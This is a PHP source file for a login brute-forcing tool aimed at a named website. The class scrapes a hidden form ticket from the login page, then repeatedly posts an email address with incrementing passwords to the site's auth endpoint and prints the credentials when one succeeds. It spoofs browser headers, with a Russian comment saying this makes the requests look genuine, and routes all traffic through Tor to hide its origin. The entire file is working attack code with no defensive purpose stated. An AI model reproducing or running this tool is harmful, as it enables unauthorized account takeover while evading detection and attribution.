<?php

class Brute 
{

    protected $url;
    protected $cookies;
    protected $uname;
    protected $pass;
    protected $name;
    protected $return;
    public static $flag;

    public function  __construct()
    {
        $this->uname='ya.pupkinsasha@yandex.com';
        $this->pass='superpasa'; 

        $this->url='http://super-turbo-dubler.com/';
	#$this->url='https://2ip.ru/';
        $this->cookies='/tmp/cookies.txt';
	

    }
    
    public function test()
    {
	$result = $this->firstConnect();
	
	$dom = new DOMDocument();
        @$dom->loadHTML($result);
        
        $mas=array();
        $el=$dom->getElementsByTagName('input');      
    	
	$hash = $el->item(2)->getAttribute('value'); #in form hidden param
	
	for($i=0;$i<30;$i++)
	{

	    print $this->pass . "\n";

	    $param = 'auth_password=' . $this->pass
		. '&auth_ticket=' .  $hash
		. '&auth_email=' . $this->uname;



	    $result = $this->tastParam($param);

	    $values = json_decode($result);


	    if(isset($values->state) &&  3 == $values->state)
	    {
		echo 'pass : ' . $this->pass . "\n";
		echo 'login: ' . $this->uname . "\n";

		#return true;
		break;
	    }

	    $this->pass++;
	}


	#return false;
    }

    

    
    public function tastParam($params)
    {     
        $ch = curl_init($this->url . 'ajax/avtorizen/' );
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (бла бла бла..) "); 
        # User-Agent

        $headers = array
            (
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
                'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
                'Accept-Encoding: deflate',
                'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7'
            ); 

        curl_setopt($ch, CURLOPT_HTTPHEADER,$headers); 
        # добавляем заголовков к нашему запросу. Чтоб смахивало на настоящих
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookies);  
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookies);

        curl_setopt($ch, CURLOPT_POST, 1); //POST METHOD
       
	# post данные.
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params); 

	#tor		
	curl_setopt($ch, CURLOPT_PROXY, 'localhost:9050');
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        # Убираем вывод данных в браузер. Пусть функция их возвращает а не выводит

        $result = curl_exec($ch); // выполняем запрос curl - обращаемся к сервера php.sulti
        curl_close($ch);

        //print_r($ch);
        return $result;
    }     

    function firstConnect()
    {
	$ch = curl_init($this->url);
	curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (бла бла бла..) "); 
	# User-Agent

	$headers = array
	    (
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
		'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
		'Accept-Encoding: deflate',
		'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7'
	    ); 

	curl_setopt($ch, CURLOPT_HTTPHEADER,$headers); 
	# добавляем заголовков к нашему запросу. Чтоб смахивало на настоящих
	curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookies);  
	curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookies);
	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	
	#tor		
	
	curl_setopt($ch, CURLOPT_PROXY, 'localhost:9050');
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
		
	#endtor
	# Убираем вывод данных в браузер. Пусть функция их возвращает а не выводит

	$result = curl_exec($ch); // выполняем запрос curl - обращаемся к сервера php.su
	curl_close($ch);

	return $result;
    }
    
   }
